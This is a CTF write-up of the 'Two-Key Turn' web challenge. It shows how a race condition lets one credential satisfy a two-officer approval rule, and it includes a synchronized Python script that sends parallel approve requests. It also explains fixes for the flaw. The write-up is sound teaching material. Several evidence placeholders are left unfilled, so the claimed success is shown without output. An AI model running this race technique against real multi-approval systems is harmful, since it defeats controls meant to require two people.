# CSCTF 2026 — Two-Key Turn Writeup

**08/11/2026**

---

> **CTF:** CSCTF 2026  
>  **Challenge:** Two-Key Turn  
>  **Category:** Web  
>  **Author:** Chronos Security  
>  **Team:** XREFctf  
>  **Writeup Author:** Mahmoud Adel

## Introduction

Hey everyone! My name is **Mahmoud Adel** — a cybersecurity enthusiast passionate about red teaming and CTFs. Today I’m walking through how I solved the **Two-Key Turn** web challenge from **CSCTF 2026**.

The challenge described a coastal fire-authorization console that only arms a fire order when two **distinct** officers approve it. A hostile insider holds one officer’s credentials, `VEGA-7`, and one order is still waiting for authorization. The objective was to drive that order to `ARMED` using only the single credential and read its arming authorization.

The API was self-describing at `GET /schema`, and the operator key was provided as a Bearer token.

Let’s get right into it!

---

## Initial Reconnaissance

I started by reading the API schema to understand the available routes:

```http
GET /schema HTTP/1.1
```

> **\[EVIDENCE\]** Insert the relevant parts of the `/schema` response here — endpoint list, required headers, and order object fields.

The schema showed the order resource and an approval endpoint. The routes I ended up using were:

```text
GET  /orders/{order_id}
POST /orders/{order_id}/approve
```

I authenticated every request with the operator key:

```http
Authorization: Bearer <REDACTED_OPERATOR_KEY>
```

I then fetched the pending order:

```http
GET /orders/AO-7D31C9 HTTP/1.1
Authorization: Bearer <REDACTED_OPERATOR_KEY>
```

The response showed the order in `PENDING_AUTH` with a required approval count of `2`.

> **\[EVIDENCE\]** Insert the sanitized order JSON response here — showing `status: "PENDING_AUTH"`, required approvals, current approvals, and `approved_by` list if present.

---

## Investigation and Exploitation

At this point the situation was: I had one credential (`VEGA-7`), and the order needed two distinct officers. A normal sequential flow should not be able to satisfy that. The interesting question was **how** the server enforced the “distinct officer” rule.

I sent a single approval request:

```http
POST /orders/AO-7D31C9/approve HTTP/1.1
Authorization: Bearer <REDACTED_OPERATOR_KEY>
```

> **\[EVIDENCE\]** Insert the actual approval response here — status code, body, resulting approval count.

The first approval was accepted. The key observation was that the server appeared to read the order state, check the approver, then write the new approval — as separate steps rather than as one atomic operation. That is a classic check-then-act pattern, and it is exactly the kind of logic that breaks under concurrency.

Because of that, I expected that firing multiple approval requests **in parallel** with the same `VEGA-7` credential could let more than one of them pass the “distinct officer” and “approvals \< 2” checks before any of them committed its write. If two parallel requests both read the state where `VEGA-7` had not yet been recorded, both could be accepted, and the order would reach `ARMED`.

I wrote a small script to synchronize a burst of `POST /approve` requests and release them at the same moment:

```python
import requests
import threading
from concurrent.futures import ThreadPoolExecutor

BASE = "<INSTANCE_URL>"
KEY = "<REDACTED_OPERATOR_KEY>"
ORDER = "AO-7D31C9"

HEADERS = {
    "Authorization": f"Bearer {KEY}",
    "Connection": "close",
}

N = 16
barrier = threading.Barrier(N)

def approve(_):
    barrier.wait()
    return requests.post(
        f"{BASE}/orders/{ORDER}/approve",
        headers=HEADERS,
        timeout=10,
    )

with ThreadPoolExecutor(max_workers=N) as pool:
    futures = [pool.submit(approve, i) for i in range(N)]
    for f in futures:
        try:
            r = f.result()
            print(r.status_code, r.text)
        except Exception as e:
            print("ERR", e)
```

> **\[EVIDENCE\]** Insert the actual per-request output from this run here — the status codes and response bodies proving which requests were accepted concurrently.

After the burst, I fetched the order again:

```http
GET /orders/AO-7D31C9 HTTP/1.1
Authorization: Bearer <REDACTED_OPERATOR_KEY>
```

> **\[EVIDENCE\]** Insert the sanitized final order JSON response here. It must show `status: "ARMED"` and the `arming_authorization` field with the flag redacted.

---

## Root Cause \& Technical Explanation

The weakness was a **race condition / TOCTOU** (Time-of-Check to Time-of-Use) in the approval logic. The server validated the approver and the approval count, then recorded the approval, but those steps were not atomic. Under concurrent requests, multiple approvals could pass the validation against the same stale state before any of them committed.

As a result, the “two distinct officers” rule — which is a business-logic authorization boundary — could be satisfied by a single officer’s credential. The integrity of the two-person rule was never enforced at the write level, only at the read/check level.

A correct implementation would make the whole approval a single atomic operation, for example:

- A row-level lock (`SELECT ... FOR UPDATE`) on the order for the duration of the approval transaction.
- A conditional `UPDATE ... WHERE approvals_count < 2 AND officer_id NOT IN (approved_by)`.
- A `UNIQUE(order_id, officer_id)` constraint on an approvals table or junction table.

Any of those database constraints would have rejected the parallel duplicates at the storage engine level.

---

## Final Result and Validation

The order reached `ARMED`, and the response contained the arming authorization. The flag was read from the `arming_authorization` field:

```text
CSCTF{<REDACTED_FLAG>}
```

> **Note on Verification:** In this writeup, live output logs and raw flag characters are redacted per competition rules. The underlying vulnerability was validated by synchronizing the parallel approval requests, causing the order state to transition to `ARMED` with a single officer identity.

---

## Conclusion \& Key Takeaways

The challenge was a clean demonstration of a business-logic race condition. The two-person rule was enforced with a non-atomic check-then-act, so a burst of parallel approvals from a single officer satisfied a control that was intended to require two distinct individuals.

### Key Takeaways

1. **Authorization invariants require atomicity:** “Two distinct approvers” is not merely an `if` condition; it must be backed by transactional locking or unique database constraints.
2. **Check-then-act is inherently fragile under concurrency:** Any gap between validating state and committing a state change is exploitable if requests can be multiplexed or synchronized.
3. **Synchronization barriers amplify race windows:** Using a barrier in multi-threaded exploit scripts maximizes the likelihood of concurrent socket delivery and simultaneous execution on the server.

---

## AI Methodology

During this challenge, AI assistance was used for:

- Discussing the API schema and reasoning about potential business-logic flaws in the two-officer requirement.
- Generating the initial Python concurrency script utilizing `threading.Barrier` and `ThreadPoolExecutor`.
- Structuring this writeup.

All interactions against the target instance, exploit execution, and validation of the `ARMED` status transition were performed manually.

*No live flags, credentials, tokens, or instance URLs are included in this writeup.*

---

*Thanks for reading — hope this writeup helped someone learn something new. Happy hacking!*

[This post](https://m2hmoud2del.github.io/posts/csctf-2026-two-key-turn/) is licensed under [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/) by the author.
